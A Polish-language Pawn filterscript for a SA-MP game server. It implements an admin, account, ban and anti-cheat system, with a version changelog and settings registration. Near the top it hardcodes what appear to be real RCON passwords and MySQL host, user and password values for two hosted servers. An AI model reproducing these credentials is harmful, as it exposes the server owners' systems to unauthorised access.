/*
	- System sprawdzajacy nicki pod katem podobnych liter np. male L (l) i duze i (I).
	- "Notatnik" dla adminsitracji
	- Baza danych multikont
	- Zapis HP, z ktorym wyszedl gracz z serwera do ostatnich wyjsc z serwera.
	- (BUG) Przydzielenie statusu RCON dla konta gracza nie dziala poprawnie dla bazy danych SQL
	
	
	
	+ v1.0.0
	    + R-1
	    + R-2
	    + R-3
	        + (Bugfix) Poprawiono blad obslugi 'panelu HA - Gracz - Nadawanie przywilejow RCON' dla bazy SQLite.
		+ R-4
		    + (Poprawka) Poprawiono wysylanie wiadomosci na chacie. W przypadku braku odpowiedniego callbacka w gamemodzie, wiadomosc nie bedzie zatrzymywana przez skrypt.
			+ (Poprawka) Poprawiono kod operacji cyklicznych.
		+ R-5
		    + (Nowosc) Dodano anty cheat na mozliwosc wchodzenia na serwer z tego samego IP w krotkim czasie.
		    + (Nowosc) Dodano anty cheat na calkowicie nieuzywane bronie.
		    + (Nowosc) Dodano anty cheat na rejoin spambot'a.
		    + (Nowosc) Dodano anty cheat na chat spambot'a.
		    + (Nowosc) Dodano anty cheat na commands spambot'a.
		    + (Bugfix) Poprawiono dzialanie funkcji zwiazanych z logowaniem do bazy MySQL.
		    + (Nowosc) Dodano anty cheat na jetpack.
			+ (Nowosc) Antycheat na sampowe pieniadze.
			+ (Nowosc) Dodano kolumny statystyk dziennych do bazy danych (nieoskryptowane statystyki dzienne).
			+ (Nowosc) Antycheat na fakekill.
			+ (Nowosc) Dodano ustawienia antycheata.
			+ (Nowosc) Zautomatyzowano proces permanentnej blokady broni (polaczenie miedzy GM a systemem).
			+ (Nowosc) Blokada wiadomosci na chacie uzywajacych RCON'a lub funkcji przydzielajacej konto administratora.
			
		+ R-6
		    + (Poprawka) Poprawiono dzialanie funkcji pobierajacej FPS'y gracza.
		    + (Poprawka) Dodano makro 'forplayers' z powodu jego usuniecia z 'a_func.inc'.
			+ (Bugfix) Poprawiono blad powodujacy, ze niezarejestrowani gracze nie mogli pisac prywatnych wiadomosci.
			+ (Nowosc) Niezarejstrowany gracz ma dostep do ustawien przez uzycie komendy '/konto'.
			+ (Poprawka) Zmieniono komende '/re' na '/resp'.
			
	+ v1.0.1
	    + (Nowosc) Dodano kod anty cheata - godmode.
	    + (Nowosc) Dodano komende '/check' dla administracji 1 i 2 lvl.
	    + (Nowosc) Dodano ustawienie czestotliwosci testu pingu, fps'ow i traconych pakietow.
	    + (Zmiana) Zmieniono komende '/resp' na '/rpm'.

	+ v1.0.1 R-2
	    + (Bugfix) Poprawiono funkcje blokowania czasowego.
	    + (Bugfix) Usunieto nadmierny odstep w prywatnych wiadomosciach.
	    
	+ v1.0.2
	    + (Nowosc) Dodano obsluge statystyk dziennych w panelu head admina (mozliwosc resetu).
	    + (Nowosc) Dodano kod obslugujacych reset statystyk dziennych.

	+ v1.0.3
		+ (Poprawka) Dostosowano 'OnPlayerTakeDamage' do wersji 'SA-MP 0.3z'.
		+ (Usuniecie) Usunieto PVar przechowujacy tracone pakiety gracza i wszelkie pobieranie pakietow zastapiona nowa funkcja SA-MP.
		
	+ v1.0.4
	    + (Zmiana) Zmiana systemu '/check' (mozliwosc sprawdzania przypuszczalnych poprzednich nickow graczy niezarejestrowanych).
		+ (Poprawka) Logi codzienne zawieraja wiecej informacji (bany, logi admina itp.)
		
	+ v1.0.5
	    + (Poprawka) Poprawiono blad powodujacy usuwanie kont administratorow i VIP'ow w przypadku nieaktywnosci.
	    + (Poprawka) Poprawiono blad powodujacy powstawanie blednych logow usuwanych kont.
	    + (Poprawka) Zmieniono 'return 1' w 'OnPlayerTakeDamage' na 'return 0', poniewaz z jakiegos powodu skrypt blokowal wykonywanie w/w callbacka w innych skryptach, wbrew opisowi na wiki.sa-mp.com.

	+ v1.0.6
	    + (Poprawka) Poprawiono funkcje tworzace tabele baz danych.
	    + (Poprawka) Poprawiono zapytanie 'rejestrujace' konto w bazie danych.
	    
	+ v1.0.7
		+ (Usuniecie) Usunieto kod odpowiedzialny za 'subadmina'.
		+ (Usuniecie) Usunieto kod odpowiedzialny za ustawianie statystyk graczy z panelu head admina.
		
	+ v1.0.8-a
	    + (Nowosc) Oddzielono tabele statystyk graczy od tabeli konta.
	    + (Nowosc) Synchronizacja usuwania kont graczy z nowa tabela statystyk.
	    
	+ v1.0.8-b
	    + (Poprawka) Przeniesiono reset statystyk dziennych na nowa tabele.
	    + (Poprawka) Przeniesiono reset statystyk miesiecznych na nowa tabele.
	    + (Poprawka) Przeniesiono reset konta gracza na nowa tabele.
	    + (Poprawka) Synchronizacja rejestracji.
	    + (Poprawka) Synchronizacja logowania.
	+ v1.0.9
		+ (Nowosc) Dodano komende '/ignore [ID Gracza]' blokujaca lub odblokowujaca prywatne wiadomosci od gracza o podanym ID.
		+ (Poprawka) Poprawiono powiadomienie o mozliwosci szybkiej odpowiedzi po najdejsciu prywatnej wiadomosci.
		+ (Poprawka) Zamieniono dynamiczna tablice w funkcji 'getPlayerName' na statyczna.
		+ (Poprawka) Poprawiono blad uciszania graczy, ktorzy dziedziczyli uciszenie gdy poprzedni gracza na ich ID otrzyma³ 'mute'.
		+ (Poprawka) Dodano logi uciszenia i wylaczenia uciszenia dla graczy.
		
	+ v1.1.0
	+ v1.1.1
		+ (Nowosc) Dodano ustawienie 'krytyczna wartosc traconych pakietow', powyzej ktorej gracz jest kickowany z serwera.
		+ (Nowosc) Dodano ustawienie 'krytyczna wartosc pingu', powyzej ktorej gracz jest kickowany z serwera.
		+ (Poprawka) Usunieto stare logi debuga z logowania.
*/
//==============================================================================
//------------------------------------------------------------------------------
//==============================================================================
#include <a_samp>
#include <a_func>
#include <a_data>
#include <c_logs>
#include <sql>
#include <sscanf2>
#include <colors>

#define FILTERSCRIPT
#include <zcmd>

#define USE_MVECTOR 1
#if USE_MVECTOR == 1
	#include <MVector>
#endif

//------------------------------------------------------------------------------
#define SERVER_PROTECT  2
#if SERVER_PROTECT != 0

	#define _LICENSE "hbas&*DSioj324dfsaAU;oads80uJKDS789234adsYJIasd089"

	#if SERVER_PROTECT == 1
	    #define BASE_PREFIX "ad_puk_"
		#define SERV_NAME	"~HighSkill.eu - Only for pr0! @ Pukawka.pl"
		#define SERV_PORT	7787
		#define SERV_RCON	"K7hs9dbjksaJHlasd9HN743nuN72"
		
	#elseif SERVER_PROTECT == 2
	    #define BASE_PREFIX "ad_puk_"
	    #define SERV_NAME	"HighSkill.eu ~ Only for pr0! @serverproject.pl"
	    #define SERV_PORT 	5555
	    #define SERV_RCON	"dfs543sdfaq325464gf23sadv"
	#endif
#else
    #define BASE_PREFIX "local_"
    #define SERV_RCON   "axl"
#endif
//------------------------------------------------------------------------------
#define ADMIN_SYSTEM_INT_VERSION    10101
/*
    ADMIN_SYSTEM_INT_VERSION xyyzz
    x - glowna wersja
    y - wiekszy update w formacie 01,02,...,99
    z - mniejsze poprawki w formacie 01,02,...,99
*/
#define _VERSION    "1.1.1"
#define _TIME       "23 / Sierpien / 2014"
//*********************
#define MAX_GRACZY  24
//*********************
#if defined MAX_GRACZY
	#undef MAX_PLAYERS
	#define MAX_PLAYERS MAX_GRACZY
#endif
//------------------------------------------------------------------------------
#pragma tabsize 0
#pragma dynamic 16384
//------------------------------------------------------------------------------
#define forplayers(%1) for(new %1; %1 < MAX_PLAYERS; %1 ++) if(IsPlayerConnected(%1))
//------------------------------------------------------------------------------
#define MAX_FLOAT_SETTINGS  0
#define MAX_INT_SETTINGS    100
#include <c_settings>
//------------------------------------------------------------------------------
#define GLOBAL_MODE_FOLDER  	"HighSkill/"                                	// Sciezka glownego folderu skryptu.
#define GLOBAL_LOG_FOLDER		GLOBAL_MODE_FOLDER"Logs/"                       // Sciezka glownego folderu logow.
#define GLOBAL_SETTINGS_FILE    GLOBAL_MODE_FOLDER"settings.cfg"                // Sciezka pliku ustawien.
#define RESET_FILE              GLOBAL_MODE_FOLDER"reset.cfg"                   // Sciezka pliku przechowujacego date ostatniego wykonanego resetu danych z bazy.
#define DAILY_STATS_RESET_FILE  GLOBAL_MODE_FOLDER"dstatreset.cfg"              // Sciezka pliku przechowujacego date ostatniego wykonanego resetu statystyk dziennych graczy.
#define ACC_RESET_FILE          GLOBAL_MODE_FOLDER"accreset.cfg"                // Sciezka pliku przechowujacego dane ostatniego wykonanego resetu kont.
#define VULG_LIST_FILE 			GLOBAL_MODE_FOLDER"vulgList.txt"
#define	SETTINGS_VULG_FILE		GLOBAL_SETTINGS_FILE
#define LIC_FILE                GLOBAL_MODE_FOLDER"aslic.txt"                     // Licencja systemu
#define L_TOP10					GLOBAL_LOG_FOLDER"Top10/"
#define NOT_ALLOWED_WEAPONS     GLOBAL_LOG_FOLDER"notallowedweapons.txt"
//------------------------------------------------------------------------------
#define D_BASE  				GLOBAL_MODE_FOLDER"gbase.db"                    // Sciezka uzywanej bazy SQL, w przypadku kiedy wybrany jest tryb polaczenia SQL.
#define D_MYSQL_ERROR_BASE      GLOBAL_MODE_FOLDER"mysqlerror.db"               // Sciezka awaryjnej bazy SQL, w przypadku kiedy proba polaczenia z baza MySQL sie nie powiodla.
//_______________________
/*
	Dane do polaczenia z baza danych MySQL.
*/

#if SERVER_PROTECT == 1
	#define MYSQL_HOST          "sql.pukawka.pl"
	#define MYSQL_USER          "277070"
	#define MYSQL_DATABASE      "277070_hsbase"
	#define MYSQL_PASSWORD      "rOvRe74i1fT28n"
#elseif SERVER_PROTECT == 2
	#define MYSQL_HOST          "mysql-1.ServerProject.pl"
	#define MYSQL_USER          "db_7870"
	#define MYSQL_DATABASE      "db_7870"
	#define MYSQL_PASSWORD      "b3037c6f0d06"
#else
	#define MYSQL_HOST          "localhost"
	#define MYSQL_USER          "AxL"
	#define MYSQL_DATABASE      "test"
	#define MYSQL_PASSWORD      "qwerty"
#endif
//------------------------------------------------------------------------------
#define COLOR_CONDIS    0x0474CEFF
#define C_CONDIS        "{0474CE}"
//------------------------------------------------------------------------------
/*
	Definicje mozliwych typow banow.
*/
#define B_IP	0
#define	B_HOST	1
#define B_NICK	2
#define B_GPCI	3
//------------------------------------------------------------------------------
#define PREFIX_ADMIN_CHAT   '#'
#define PREFIX_TO_ADMINS    '@'
//------------------------------------------------------------------------------
#define _ACTIVE 	0
#define _NONACTIVE  1
//------------------------------------------------------------------------------
#define ALVL_NON            0
#define ALVL_JUNIOR_ADMIN	1
#define ALVL_ADMIN			2
#define ALVL_HEAD_ADMIN		3
#define ALVL_GAME_MASTER	4
//------------------------------------------------------------------------------
#define LOGIN_STATUS_NON			0
#define LOGIN_STATUS_NOTREGISTERED	1
#define LOGIN_STATUS_NOTLOGGED		2
#define LOGIN_STATUS_LOGGED			3
//------------------------------------------------------------------------------
#define TAB_LIST_NON    				0
#define TAB_LIST_HAPANEL_PLAYER_SEARCH  1
#define TAB_LIST_APANEL_PLAYER_SEARCH   2
#define TAB_LIST_NAME_CHECK_SEARCH      3
//------------------------------------------------------------------------------
#define TEXT_PM_REVEIVED 	TEXT_DIALOG_HEAD
#define COLOR_PM_REVEIVED 	COLOR_DIALOG_HEAD

#define TEXT_PM_SENDED 		TEXT_DIALOG_BODY
#define COLOR_PM_SENDED 	COLOR_DIALOG_BODY

#define TEXT_PM_SPEC 		"{A8F0FF}"
#define COLOR_PM_SPEC	 	0xA8F0FFFF
//------------------------------------------------------------------------------
/*
	Definicje PVar'ow gracza
*/

#define PV_TAB_LIST_INFO            "PlayerTabListInfo"
#define PV_LOGIN_STATUS				"PlayerLoginStatus"
#define	PV_LOGIN_USERID				"PlayerLoginUserID"
#define	PV_LOGIN_PASSWORD			"PlayerLoginPassword"
#define	PV_LOGIN_RESET_PASSWORD		"PlayerLoginResetPassword"
#define	PV_LOGIN_REGISTER_STAMP		"PlayerLoginRegisterStamp"
#define PV_LOGIN_REGISTER_IP        "PlayerLoginRegisterIP"
#define PV_LOGIN_RCON_ADMIN         "PlayerLoginRCONAccount"
#define PV_LOGIN_ADMIN_LVL			"PlayerLoginAdminLvL"
#define	PV_LOGIN_ADMIN_PASSWORD		"PlayerLoginAdminPassword"
#define PV_LOGIN_ADMIN_STAMP		"PlayerLoginAdminStamp"
#define	PV_LOGIN_DELETE_STAMP		"PlayerLoginDeleteStamp"
#define	PV_LOGIN_LAST_LOGIN_STAMP	"PlayerLoginLastLoginStamp"
#define PV_LOGIN_LAST_LOGIN_IP		"PlayerLoginLastLoginIP"
#define PV_LOGIN_LAST_LOGIN_GPCI	"PlayerLoginLastLoginGPCI"
#define PV_LOGIN_LAST_NICK			"PlayerLoginLastNick"
#define	PV_LOGIN_LAST_NICK_STAMP	"PlayerLoginLastNickStamp"
#define	PV_LOGIN_PLAY_TIME			"PlayerLoginPlayTime"
#define PV_LOGIN_PROV_CONFIDENTAL	"PlayerLoginProvConfidental"
#define PV_LOGIN_BAN_TIME           "PlayerLoginBanTime"
#define PV_LOGIN_BAN_ADMIN_ID       "PlayerLoginBanAdminID"
#define PV_LOGIN_BAN_REASON         "PlayerLoginBanReason"
#define PV_LOGIN_LAST_DISCONNECT    "PlayerLoginLastDisconnect"
#define PV_LOGIN_VIP_TIME			"PlayerLoginVIPTime"
#define PV_LOGIN_VIP_POINTS			"PlayerLoginVIPPoints"
#define PV_LOGIN_VIP_BONUS_POINTS	"PlayerLoginVIPBounsPoints"
//_____________________
#define PV_LOGIN_FAIL				"PlayerLoginFails"
//_____________________
#define PV_ALOG_FAIL                "PlayerALogFails"
#define PV_ALOG_HIDE                "PlayerAdminListHide"
#define PV_ALOG_PASSWORD_CHANGE     "PlayerALogPasswordChange"
//_____________________
#define PV_SET_RECONNECT            "PlayerReconnect"
#define PV_CENSURE_STATUS           "PlayerCensureStatus"
#define	PV_PRIV_MESSAGES_SPEC		"PlayerPrivMessagesSpec"
//_____________________
#define PV_PLAYER_PAGE              "PlayerPage"
//_____________________
#define PV_RCON_LOGIN               "PlayerRCONLoginStatus"
#define PV_RCON_FAIL_LOGIN          "PlayerRCONFailLogins"
//_____________________
#define PV_PLAYER_FPS               "PlayerFPS"
//#define PV_PLAYER_PACKET_LOSS       "PlayerPacketLoss"
//_____________________
#define PV_FIRST_SPAWN              "PlayerFirstSpawnAS"
//==============================================================================
forward LoadServerSettings();
forward asSecondTimer();
forward asHourTimer(force);
forward remote_GetChatCensureStatus();
forward SetPlayerHealthUsed(playerid, Float:amount);
//------------------------------------------------------------------------------
forward CreateAccountDataTable();
forward DeleteAccountData(userid);
forward DailyPlayerStatsReset(bool:force);
forward AccountReset(adminname[]);
forward ResetAccountStatistics(userid, adminid);
forward AccountOnPlayerDisconnect(playerid, userid);
forward GameModeOnPlayerConnect(playerid);
forward LoadPlayerAccountData(playerid, userid);
forward OnNewAccountRegistered(userid);
forward Float:getFloatDataFromNetStats(net_string[], data[]);
//==============================================================================
new DB:dbase;                                                                   // Identyfikator bazy SQL.
new SQL:MySQLID;                                                              	// Identyfikator bazy MySQL.

new p_KeySecurity[MAX_PLAYERS];                                                 // Tablica przechowujaca postep zabezpieczenia systemu przy uzyciu przyciskow.
new bool:ChangeBaseType = false;                                                // Zmienna uzywana podczas zmiany ingame uzywanej bazy danych.
//------------------------------------------------------------------------------
enum PM_SOUNDS {SOUND_NAME[8], SOUND_ID};
new const privMessagesSounds[][PM_SOUNDS] = {
	{"Bulgot", 5202}, {"Muzyka", 5203}, {"Dzwonek", 6401}, {"Brak", 0}
};
//------------------------------------------------------------------------------
//______________________
/*
	Identyfikatory systemu ustawien 'c_settings'.
*/
//_______________________
new s_ResetTimeID;                                                              // Godzina, o ktorej maja byc zresetowane wszystkie tabele bazy danych.
//_______________________
new s_LogChatID;                                                                // Logi chatu.
new s_LogPlayersID;                                                             // Logi o zmianach na koncie gracza.
new s_LogNickChangeID;                                                          // Logi o zmianach nicku.
new s_LogPlayerInfoID;                                                          // Logi z informacjami o graczu wchodzacym na serwer.
new s_LogResetInfoID;                                                           // Logi o wykonywanych resetach danych.
new s_LogDeletingInfoID;                                                        // Logi o usuwanych kontach graczy.
new s_LogMultiAccountInfoID;                                                    // Logi informacji o prawdopodobienstwie rejestracji multi konta.
new s_LogBanInfoID;                                                             // Logi o banach na ip, host, nick, gpci.
new s_LogVIPInfoID;
//_______________________
new s_SAMPChatID;                                                               // Ustawienia okreslajace czy SA-MP'e logi chatu maja byc wlaczone, czy wylaczone.
new s_SAMPRemoteID;                                                             // Ustawienie okreslajace czy zdalna konsola RCON ma byc wlaczona, czy wylaczona.
//_______________________
new s_MySQLID;                                                                  // Ustawienie okreslajace czy ma byc uzywana baza danych SQL czy MySQL.
new s_KickAfterStart;                                                           // Ze wzgledu na blad SA-MP, ktory uniemozliwia kickowanie w trakcie wylaczania FS'a, gracze przy zmianie systemu bazy musza zostac skickowani przy starcie systemu.
//_______________________
new s_LoginTimeID;                                                              // Czas logowania na konto gracza (w sekundach).
new s_LoginFailID;                                                              // Maksymalna liczba nieudanych logowan na konto gracza, przed kickiem.
new s_LoginDeletingDaysID;                                                      // Maksymalny czas nieuzywania konta, zanim zostanie usuniete.
new s_LoginConfiID;                                                             // Czas gry, konieczny do uzyskania statusu zaufanego (w godzinach).
//_______________________
new s_ProvConfiRegisterID;                                                      // Czas warunkowego zaufanego po rejestracji konta (w godzinach).
new s_NickChangeTimeID;                                                         // Czas, ktory musi uplynac zeby moc ponownie zmienic nazwe konta (nick).
new s_RegisterObligatoryID;                                                     // Ustawienie okreslajace, czy rejestracja ma byc obowiazkowa czy dobrowolna.
new s_StartingCaptchaID;                                                        // Ustawienie okreslajace, czy w przypadku braku obowiazku rejestracji, gracz musi potwierdzic, ze nie jest botem, przez wpisanie kodu captchy.
new s_StartingCaptchaTimeID;                                                    // Czas, ktory ma gracz na potwierdzenie kodu captchy przy obowiazku jego potwierdzenia po wejsciu na serwer.
//_______________________
new s_NickChangeMaxTimeID;                                                      // Czas, po ktorym usuwany jest wpis o zmianie nicku przez gracza.
new s_PlayerInfoMaxTimeID;                                                      // Czas, po ktorym usuwany jest wpis o wejsciu gracza na serwer.
//_______________________
new s_CopyDeletingID;                                                           // Ustawienie okreslajace czy po usunieciu konta z bazy danych, jego wpisy plikowe maja byc skopiowane do specjalnego folderu czy usuniete.
new s_RegisterMinTimeID;                                                        // Minimalny czas jaki musi uplynac miedzy dwoma rejestracjami kont z tego samego IP.
new s_ReconnectMaxTimeID;                                                       // Maksymalny czas w jakim gracz moze dokonac reconnectu bez logowania sie.
//_______________________
new s_ALogLoginFailsID;                                                         // Maksymalna ilosc nieudanych logowan aLog.
//_______________________
new s_NonActiveAdminInfoID;                                                     // Ilosc dni nieaktywnosci admina, po ktorej jest on pokazywany w liscie nieaktywnych administratorow.
new s_NADelAdminRightsID;      			                                        // Czas nieaktywnosci, po ktorym automatycznie usuwane sa prawa administratora.
//_______________________
new s_BanTimeJAdminID;                                                          // Maksymalny czas w minutach na jaki admin o poziomie junior admina moze dac kicka
new s_BanTimeAdminID;                                                           // Maksymalny czas w godzinach na jaki admin o poziomie HA i wyzej moze dac bana
new s_MuteMaxTimeID;
//_______________________
new s_AutomaticCyclicOps;                                                       // Ustawienie decydujace czy operacje cykliczne maja byc wykonywane automatycznie.
new s_AutomaticAccReset;                                                        // Ustawienie decydujace czy ma byc wykonywany automatyczny reset kont.
new s_AutoAccResetDay;                                                          // Dzien wykonywania resetu kont graczy.
new s_AutoDailyStatsReset;                                                      // Wykonywanie automatycznego resetu statystyk dziennych kont graczy wraz z operacjami cyklicznymi.
//_______________________
new s_RCONAccountsID;                                                           // Ustawienie regulujace, czy tylko zarejestrowani uzytkownicy z przyznanymi prawami moga logowac sie na konto RCON.
new s_RCONFailLoginID;                                                          // Maksymalna ilosc blednych logowan RCON.
//_______________________
new s_MaxPingID;
new s_MaxPingWarningsID;
new s_MinFPSID;
new s_MinFPSWarningsID;
new s_MaxPLossID;
new s_MaxPLossWarningsID;
new s_CheckDataFrequencyID;
new s_AdminLimitsID;
new s_VIPLimitsID;
new s_MaxPLossCriticalLimitID;
new s_MaxPingCriticalLimitID;
//_______________________
new s_VIPRegisterTimeID;
new s_VIPRegisterPointsID;
new s_VIP3DaysCostID;
new s_VIP7DaysCostID;
new s_VIP30DaysCostID;
new s_VIPTimeBanID;
//_______________________
new s_ConDisInfoID;                                                             // Ustawienie decydujace czy maja byc pokazywane informacje o polaczeniu / rozlaczeniu gracza z serwerem.
new	s_CensureStatusID;                                                          // ID ustawienia przechowujacego status cenzury globalnej (brak, wygwiazdkowanie, blokowanie).
new s_CensureMuteStatusID;                                                      // ID ustawienia przechowujacego status ostrzezen za przeklinanie na chacie.
new s_CensureMuteTimeID;                                                        // ID ustawienia przechowujacego czas trwania blokady za przeklinanie.
new s_CensureMaxWarningsID;                                                     // ID ustawienia przechowujacego maksymalna liczbe ostrzezen o przeklinaniu.
new s_AntySpamStatusID;                                                         // ID ustawienia przechowujacego status anty spamu.
new s_AntySpamMinTimeID;                                                        // ID ustawienia przechowujacego czas, ktory musi uplynac miedzy dwiema wiadomosciami na chacie.
new s_AntyFloodStatusID;                                                        // ID ustawienia przechowujacego status anty flooda.
new s_AntyFloodMinTimeID;                                                       // ID ustawienia przechowujacego czas, ktory musi uplynac miedzy dwiema, takimi samymi wiadomosciami na chacie.
new s_PrivMessagesID;                                                           // ID ustawienia decyduj¹cego o tym czy prywatne wiadomoœci i kontrola nad nimi maj¹ byæ dostêpne z poziomu skryptu administracyjnego.
new s_PrivMessagesSpecID;                                                       // Ustawienie okreslajace od ktorego poziomu praw administratora bedzie mozliwe obserwowanie cudzych prywatnych wiadomosci.
//_______________________
new s_ACConnectionSpamBotStatusID;
new s_ACConnectionSpamBotTimeID;
new s_ACAntyWeaponStatusID;
new s_ACAntyReJoinSpamStatusID;
new s_ACAntyReJoinSpamTryID;
new s_ACAntySpamBotStatusID;
new s_ACAntySpamBotMsgPerSecID;
new s_ACAntyCMDSpamBotStatusID;
new s_ACAntyCMDSpamBotMsgPerSecID;
new s_ACAntyJetpackStatusID;
new s_ACAntyMoneyHackStatusID;
new s_ACAntyMoneyHackActionID;
new s_ACAntyFakeKillSpamBotStatusID;
new s_ACAntyFakeKillsPerSecStatusID;
new s_ACAntyGodmodeStatusID;
new s_ACAntyGodmodeMaxWarnsID;
new s_ACAntyGodmodeTicksID;

//==============================================================================
#include "includes/m_sql.inc"
#include "includes/m_bases.inc"
#include "includes/m_logs.inc"
#include "includes/m_dialog.inc"
//------------------------------------
#include "includes/m_player.inc"
//------------------------------------
#include "includes/AccSystem/m_register.inc"
#include "includes/AccSystem/m_login.inc"
#include "includes/AccSystem/m_accfunc.inc"
//------------------------------------
#include "includes/AC/smallac.inc"
//------------------------------------
#include "includes/AdminSystem/m_admin.inc"
#include "includes/AdminSystem/m_aspecial.inc"
#include "includes/AdminSystem/m_alist.inc"
#include "includes/AdminSystem/as_adminpanel.inc"
#include "includes/AdminSystem/as_hapanel.inc"
//------------------------------------
#include "includes/BanSystem/m_ban.inc"
#include "includes/BanSystem/m_playerban.inc"
//------------------------------------
#include "includes/m_vulg.inc"
//------------------------------------
//#include "includes/Gamemodes/duelarena.inc"
#include "includes/Gamemodes/hsad.inc"
//==============================================================================
//------------------------------------------------------------------------------
//==============================================================================
public OnFilterScriptInit() {
    //-------------------------------
    #if SERVER_PROTECT != 0
	new string[64];
	GetServerVarAsString("rcon_password", string, sizeof(string));
	if(strcmp(string, SERV_RCON, true) != 0)	print("reason: 1"), SendRconCommand("exit");
	else {
		if(GetServerVarAsInt("port") != SERV_PORT)	print("reason: 2"), SendRconCommand("exit");
		else {
		    GetServerVarAsString("hostname", string, sizeof(string));
			if(strcmp(string, SERV_NAME, true) != 0)	print("reason: 3"), SendRconCommand("exit");
			else {
			    new	File:f_open;
                if(fexist(LIC_FILE)) {
					f_open = fopen(LIC_FILE, io_read);
					fread(f_open, string, sizeof(string));
					fclose(f_open);
					if(strcmp(string, _LICENSE, false) != 0)	print("reason: 4"), SendRconCommand("exit");
                }	else SendRconCommand("exit");
			}
	    }
    }
    #endif
    
    //-------------------------------
	if(CheckFolderPatch(GLOBAL_MODE_FOLDER) == _FALSE) {
	    AddToErrorLog("System: Nieodnaleziono glownego folderu skryptu o sciezce '"GLOBAL_MODE_FOLDER"'");
	    SendRconCommand("exit");
	    return 1;
	}
	//-------------------------------

    //_______________________
    s_ResetTimeID           = registerIntSetting("reset_time", 		GLOBAL_SETTINGS_FILE, 14, 0, 23);
    //_______________________
	s_LogChatID 			= registerIntSetting("l_chat", GLOBAL_SETTINGS_FILE, 1, 0, 1);
	s_LogPlayersID 			= registerIntSetting("l_players", GLOBAL_SETTINGS_FILE, 1, 0, 1);
	s_LogNickChangeID       = registerIntSetting("l_nick_change", GLOBAL_SETTINGS_FILE, 1, 0, 1);
	s_LogPlayerInfoID       = registerIntSetting("l_player_info", GLOBAL_SETTINGS_FILE, 1, 0, 1);
    s_LogResetInfoID        = registerIntSetting("l_reset_info", GLOBAL_SETTINGS_FILE, 1, 0, 1);
    s_LogDeletingInfoID 	= registerIntSetting("l_deleting_info", GLOBAL_SETTINGS_FILE, 1, 0, 1);
    s_LogMultiAccountInfoID = registerIntSetting("l_multiaccount_info", GLOBAL_SETTINGS_FILE, 1, 0, 1);
    s_LogBanInfoID 			= registerIntSetting("l_ban_info", GLOBAL_SETTINGS_FILE, 1, 0, 1);
    s_LogVIPInfoID          = registerIntSetting("l_vip_info", GLOBAL_SETTINGS_FILE, 1, 0, 1);
    //_______________________
    s_SAMPChatID 			= registerIntSetting("samp_chat", GLOBAL_SETTINGS_FILE, 0, 0, 1);
    s_SAMPRemoteID 			= registerIntSetting("samp_remote", GLOBAL_SETTINGS_FILE, 0, 0, 1);
    //_______________________
    s_MySQLID 				= registerIntSetting("use_mysql", GLOBAL_SETTINGS_FILE, 0, 0, 1);
    s_KickAfterStart		= registerIntSetting("kick_after_start", GLOBAL_SETTINGS_FILE, 0, 0, 1);
    //_______________________
    s_LoginTimeID       	= registerIntSetting("login_time", GLOBAL_SETTINGS_FILE, 10, 5, 60);
    s_LoginFailID       	= registerIntSetting("login_max_fail", GLOBAL_SETTINGS_FILE, 3, 0, 10);
    s_LoginDeletingDaysID 	= registerIntSetting("login_deleting", GLOBAL_SETTINGS_FILE, 7, 7, 999);
    s_LoginConfiID 			= registerIntSetting("login_confi", GLOBAL_SETTINGS_FILE, 48, 6, 8760);
    //_______________________
    s_ProvConfiRegisterID   = registerIntSetting("reg_profconfi", GLOBAL_SETTINGS_FILE, 24, 0, 8760);
    s_NickChangeTimeID   	= registerIntSetting("nick_change", GLOBAL_SETTINGS_FILE, 7, 0, 365);
    s_RegisterObligatoryID 	= registerIntSetting("register_obligatory", GLOBAL_SETTINGS_FILE, 0, 0, 2);
    s_StartingCaptchaID 	= registerIntSetting("starting_captcha", GLOBAL_SETTINGS_FILE, 1, 0, 1);
    s_StartingCaptchaTimeID	= registerIntSetting("starting_captcha_time", GLOBAL_SETTINGS_FILE, 10, 5, 60);
    //_______________________
    s_NickChangeMaxTimeID   = registerIntSetting("nick_change_max_time", GLOBAL_SETTINGS_FILE, 30, 7, 365);
    s_PlayerInfoMaxTimeID   = registerIntSetting("player_info_max_time", GLOBAL_SETTINGS_FILE, 30, 7, 365);
    //_______________________
    s_CopyDeletingID        = registerIntSetting("copy_deleting", GLOBAL_SETTINGS_FILE, 1, 0, 1);
    s_RegisterMinTimeID     = registerIntSetting("register_min_time", GLOBAL_SETTINGS_FILE, 1, 1, 120);
    s_ReconnectMaxTimeID    = registerIntSetting("auto_login", GLOBAL_SETTINGS_FILE, 10, 0, 60);
    //_______________________
    s_ALogLoginFailsID      = registerIntSetting("alog_login_fail", GLOBAL_SETTINGS_FILE, 3, 0, 10);
    //_______________________
    s_NonActiveAdminInfoID  = registerIntSetting("anon_active_info", GLOBAL_SETTINGS_FILE, 2, 1, 365);
    s_NADelAdminRightsID    = registerIntSetting("anon_active_delete", GLOBAL_SETTINGS_FILE, 30, 7, 365);
    //_______________________
    s_BanTimeJAdminID  		= registerIntSetting("max_ban_time_jadmin", GLOBAL_SETTINGS_FILE, 60, 1, 60);
    s_BanTimeAdminID  		= registerIntSetting("max_ban_time_admin", GLOBAL_SETTINGS_FILE, 48, 1, 96);
    s_MuteMaxTimeID         = registerIntSetting("mute_max_time", GLOBAL_SETTINGS_FILE, 10, 5, 60);
	//_______________________
	s_AutomaticCyclicOps    = registerIntSetting("auto_cyclic_ops", GLOBAL_SETTINGS_FILE, 1, 0, 1);
	s_AutomaticAccReset    	= registerIntSetting("auto_acc_reset", GLOBAL_SETTINGS_FILE, 1, 0, 1);
	s_AutoAccResetDay       = registerIntSetting("auto_acc_reset_day", GLOBAL_SETTINGS_FILE, 1, 1, 31);
	s_AutoDailyStatsReset  	= registerIntSetting("auto_dstats_reset", GLOBAL_SETTINGS_FILE, 0, 0, 1);
	//_______________________
	s_RCONAccountsID    	= registerIntSetting("rcon_only_registered", GLOBAL_SETTINGS_FILE, 0, 0, 1);
	s_RCONFailLoginID    	= registerIntSetting("rcon_max_fail_logins", GLOBAL_SETTINGS_FILE, 3, 0, 99);
	//_______________________
	s_ConDisInfoID          = registerIntSetting("condis_info", 		GLOBAL_SETTINGS_FILE, 1, 0, 1);
	s_CensureStatusID 		= registerIntSetting("censure_status", 		GLOBAL_SETTINGS_FILE, C_CENSURE, 			0, 2);
    s_CensureMuteStatusID 	= registerIntSetting("censure_mute", 		GLOBAL_SETTINGS_FILE, 1, 					0, 1);
    s_CensureMuteTimeID 	= registerIntSetting("censure_mutetime", 	GLOBAL_SETTINGS_FILE, VULG_MUTE_TIME, 		1, 30);
    s_CensureMaxWarningsID 	= registerIntSetting("censure_warnings", 	GLOBAL_SETTINGS_FILE, MAX_WARNINGS_TO_MUTE, 1, 99);
